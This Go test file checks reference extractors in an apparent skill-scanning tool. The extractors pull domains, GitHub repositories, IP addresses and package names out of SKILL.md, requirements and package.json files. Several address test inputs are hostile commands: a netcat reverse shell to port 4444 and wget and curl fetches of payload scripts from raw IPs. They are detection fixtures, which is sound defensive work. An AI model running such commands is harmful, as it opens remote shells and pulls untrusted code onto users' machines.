// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 skill-verdict authors

package refcheck_test

import (
	"net/http"
	"reflect"
	"testing"

	"github.com/bickus/skill-verdict/pkg/finding"
	"github.com/bickus/skill-verdict/pkg/internal/refcheck"
	"github.com/bickus/skill-verdict/pkg/refs"
)

type extractCase struct {
	name string
	path string
	text string
	want []refs.Ref
}

func refAt(kind refs.Kind, value, file string, line int) refs.Ref {
	return refs.Ref{Kind: kind, Value: value, Locations: []finding.Location{{File: file, Line: line}}}
}

func ref(kind refs.Kind, value string) refs.Ref {
	return refAt(kind, value, "SKILL.md", 1)
}

func refURL(kind refs.Kind, value, full string, line int) refs.Ref {
	return withURL(refAt(kind, value, "SKILL.md", line), full)
}

func withURL(r refs.Ref, full string) refs.Ref {
	r.URLs = []string{full}
	return r
}

var domainExtractCases = []extractCase{
	{"https url", "SKILL.md", "See https://Example.com/docs.\n", []refs.Ref{refURL(refs.Domain, "example.com", "https://Example.com/docs", 1)}},
	{"http url with port", "SKILL.md", "http://example.org:8080/x\n", []refs.Ref{refURL(refs.Domain, "example.org", "http://example.org:8080/x", 1)}},
	{"ip address skipped", "SKILL.md", "http://10.0.0.1/x and http://[::1]/y\n", nil},
	{"localhost skipped", "SKILL.md", "http://localhost:3000/\n", nil},
	{"github skipped", "SKILL.md", "https://github.com/acme/tool\n", nil},
	{"comment line skipped", "SKILL.md", "  # see https://example.com\n", nil},
	{"trailing punctuation stripped", "SKILL.md", "(https://example.com/a).\n", []refs.Ref{refURL(refs.Domain, "example.com", "https://example.com/a", 1)}},
	{"quoted url", "SKILL.md", "url = \"https://example.net/\"\n", []refs.Ref{refURL(refs.Domain, "example.net", "https://example.net/", 1)}},
	{"markdown link", "SKILL.md", "[x](https://example.com/y)\n", []refs.Ref{refURL(refs.Domain, "example.com", "https://example.com/y", 1)}},
	{"template host skipped", "SKILL.md", "https://$HOST/path https://{{host}}/\n", nil},
	{"two hosts on one line", "SKILL.md", "https://a.example/ https://b.example/\n", []refs.Ref{refURL(refs.Domain, "a.example", "https://a.example/", 1), refURL(refs.Domain, "b.example", "https://b.example/", 1)}},
	{"second line", "SKILL.md", "first\nhttps://example.com\n", []refs.Ref{refURL(refs.Domain, "example.com", "https://example.com", 2)}},
}

var githubExtractCases = []extractCase{
	{"owner and repo", "SKILL.md", "https://github.com/acme/tool\n", []refs.Ref{refURL(refs.GitHub, "acme/tool", "https://github.com/acme/tool", 1)}},
	{"deep path", "SKILL.md", "https://github.com/acme/tool/blob/main/README.md\n", []refs.Ref{refURL(refs.GitHub, "acme/tool", "https://github.com/acme/tool/blob/main/README.md", 1)}},
	{"git suffix", "SKILL.md", "https://github.com/acme/tool.git\n", []refs.Ref{refURL(refs.GitHub, "acme/tool", "https://github.com/acme/tool.git", 1)}},
	{"owner only", "SKILL.md", "https://github.com/acme\n", []refs.Ref{refURL(refs.GitHub, "acme", "https://github.com/acme", 1)}},
	{"site section skipped", "SKILL.md", "https://github.com/settings/tokens https://github.com/orgs/x\n", nil},
	{"invalid owner skipped", "SKILL.md", "https://github.com/-bad/repo\n", nil},
	{"invalid repo skipped", "SKILL.md", "https://github.com/acme/bad%20name\n", nil},
	{"ssh clone", "SKILL.md", "git clone git@github.com:acme/tool.git\n", []refs.Ref{ref(refs.GitHub, "acme/tool")}},
	{"gh clone", "SKILL.md", "gh repo clone acme/tool\n", []refs.Ref{ref(refs.GitHub, "acme/tool")}},
	{"lowercased", "SKILL.md", "https://www.github.com/Acme/Tool\n", []refs.Ref{refURL(refs.GitHub, "acme/tool", "https://www.github.com/Acme/Tool", 1)}},
	{"other host ignored", "SKILL.md", "https://gitlab.com/acme/tool\n", nil},
	{"comment line skipped", "SKILL.md", "# https://github.com/acme/tool\n", nil},
}

var addressExtractCases = []extractCase{
	{"http url", "SKILL.md", "curl http://137.117.157.128/update/script.py\n", []refs.Ref{refURL(refs.Address, "137.117.157.128", "http://137.117.157.128/update/script.py", 1)}},
	{"https url with port", "SKILL.md", "https://10.0.0.1:8443/x\n", []refs.Ref{refURL(refs.Address, "10.0.0.1", "https://10.0.0.1:8443/x", 1)}},
	{"ipv6 url", "SKILL.md", "http://[2001:db8::1]/y\n", []refs.Ref{refURL(refs.Address, "2001:db8::1", "http://[2001:db8::1]/y", 1)}},
	{"ipv6 url with zone", "SKILL.md", "http://[fe80::1%25eth0]:8080/\n", []refs.Ref{refURL(refs.Address, "fe80::1", "http://[fe80::1%25eth0]:8080/", 1)}},
	{"host and port", "SKILL.md", "connect to 45.33.32.156:4444 first\n", []refs.Ref{ref(refs.Address, "45.33.32.156")}},
	{"ipv6 host and port", "SKILL.md", "target [2001:db8::2]:22\n", []refs.Ref{ref(refs.Address, "2001:db8::2")}},
	{"netcat target", "SKILL.md", "nc 45.33.32.156 4444 -e /bin/sh\n", []refs.Ref{ref(refs.Address, "45.33.32.156")}},
	{"ssh target", "SKILL.md", "ssh -p 2222 root@45.33.32.156\n", []refs.Ref{ref(refs.Address, "45.33.32.156")}},
	{"wget without scheme", "SKILL.md", "wget 45.33.32.156/payload.sh\n", []refs.Ref{ref(refs.Address, "45.33.32.156")}},
	{"url and bare address once per line", "SKILL.md", "curl http://45.33.32.156/a; nc 45.33.32.156 1\n", []refs.Ref{refURL(refs.Address, "45.33.32.156", "http://45.33.32.156/a", 1)}},
	{"two addresses", "SKILL.md", "nc 45.33.32.156 1 && nc 45.33.32.157 2\n", []refs.Ref{ref(refs.Address, "45.33.32.156"), ref(refs.Address, "45.33.32.157")}},
	{"version number skipped", "SKILL.md", "pip install foo==1.2.3.4\n", nil},
	{"address in prose skipped", "SKILL.md", "the server 45.33.32.156 answered\n", nil},
	{"command after separator skipped", "SKILL.md", "curl example.com && echo 45.33.32.156\n", nil},
	{"domain skipped", "SKILL.md", "https://example.com/\n", nil},
	{"comment line skipped", "SKILL.md", "# http://1.2.3.4/\n", nil},
	{"code file", "scripts/helper.py", "url = 'http://203.0.113.9/a'\n", []refs.Ref{withURL(refAt(refs.Address, "203.0.113.9", "scripts/helper.py", 1), "http://203.0.113.9/a")}},
}

var packageExtractCases = []extractCase{
	{"pip install", "SKILL.md", "pip install requests\n", []refs.Ref{ref(refs.Package, "pypi:requests")}},
	{"extras and specifier", "SKILL.md", "pip3 install \"Requests[security]>=2.0\"\n", []refs.Ref{ref(refs.Package, "pypi:requests")}},
	{"python module pip", "SKILL.md", "python -m pip install numpy pandas==1.0\n", []refs.Ref{ref(refs.Package, "pypi:numpy"), ref(refs.Package, "pypi:pandas")}},
	{"uv pip", "SKILL.md", "uv pip install httpx\n", []refs.Ref{ref(refs.Package, "pypi:httpx")}},
	{"pipx", "SKILL.md", "pipx install Flask_Login\n", []refs.Ref{ref(refs.Package, "pypi:flask-login")}},
	{"editable path", "SKILL.md", "pip install -e .\n", nil},
	{"requirements flag", "SKILL.md", "pip install -r requirements.txt\n", nil},
	{"index url flag", "SKILL.md", "pip install --index-url https://x.test/simple foo\n", []refs.Ref{ref(refs.Package, "pypi:foo")}},
	{"paths and urls", "SKILL.md", "pip install ./local git+https://github.com/a/b\n", nil},
	{"uvx", "SKILL.md", "uvx ruff check .\n", []refs.Ref{ref(refs.Package, "pypi:ruff")}},
	{"uvx from", "SKILL.md", "uvx --from httpie http\n", []refs.Ref{ref(refs.Package, "pypi:httpie")}},
	{"npm install", "SKILL.md", "npm install express lodash@4\n", []refs.Ref{ref(refs.Package, "npm:express"), ref(refs.Package, "npm:lodash")}},
	{"npm global", "SKILL.md", "npm i -g TypeScript\n", []refs.Ref{ref(refs.Package, "npm:typescript")}},
	{"npm option value", "SKILL.md", "npm install --otp 123456 react\n", []refs.Ref{ref(refs.Package, "npm:react")}},
	{"yarn scoped", "SKILL.md", "yarn add @types/node@18\n", []refs.Ref{ref(refs.Package, "npm:@types/node")}},
	{"pnpm alias", "SKILL.md", "pnpm add myalias@npm:react@18\n", []refs.Ref{ref(refs.Package, "npm:react")}},
	{"npm paths", "SKILL.md", "npm install ./local user/repo\n", nil},
	{"npx", "SKILL.md", "npx create-react-app app\n", []refs.Ref{ref(refs.Package, "npm:create-react-app")}},
	{"npx scoped", "SKILL.md", "npx -y @scope/cli\n", []refs.Ref{ref(refs.Package, "npm:@scope/cli")}},
	{"two commands", "SKILL.md", "pip install foo && npm install bar\n", []refs.Ref{ref(refs.Package, "pypi:foo"), ref(refs.Package, "npm:bar")}},
	{"comment line skipped", "SKILL.md", "# pip install requests\n", nil},
	{"requirements file", "requirements-dev.txt", "requests>=2\n# comment\n-r other.txt\nFlask_Login[x]==1 ; python_version>'3'\n./local\n",
		[]refs.Ref{refAt(refs.Package, "pypi:requests", "requirements-dev.txt", 1), refAt(refs.Package, "pypi:flask-login", "requirements-dev.txt", 4)}},
	{"package json", "package.json", "{\n \"dependencies\": {\n  \"express\": \"^4\",\n  \"local\": \"file:../x\",\n  \"ali\": \"npm:react@18\"\n },\n \"devDependencies\": {\"jest\": \"29\"}\n}\n",
		[]refs.Ref{refAt(refs.Package, "npm:react", "package.json", 5), refAt(refs.Package, "npm:express", "package.json", 3), refAt(refs.Package, "npm:jest", "package.json", 7)}},
	{"package json key in another object", "package.json", "{\n \"scripts\": {\"react\": \"echo unrelated\"},\n \"dependencies\": {\n  \"react\": \"^19\"\n }\n}\n",
		[]refs.Ref{refAt(refs.Package, "npm:react", "package.json", 4)}},
	{"malformed package json", "package.json", "{\n", nil},
}

func TestExtract(t *testing.T) {
	cfg := testConfig()
	client := &http.Client{}
	collectors := []struct {
		kind  refs.Kind
		col   refcheck.Collector
		cases []extractCase
	}{
		{refs.Domain, refcheck.NewDomain(client, cfg), domainExtractCases},
		{refs.GitHub, refcheck.NewGitHub(client, cfg, ""), githubExtractCases},
		{refs.Package, refcheck.NewPackage(client, cfg), packageExtractCases},
		{refs.Address, refcheck.NewAddress(), addressExtractCases},
	}
	for _, c := range collectors {
		for _, tc := range c.cases {
			t.Run(string(c.kind)+" "+tc.name, func(t *testing.T) {
				if got := c.col.Extract(artifact(tc.path, tc.text)); !reflect.DeepEqual(got, tc.want) {
					t.Errorf("got %+v, want %+v", got, tc.want)
				}
			})
		}
	}
}
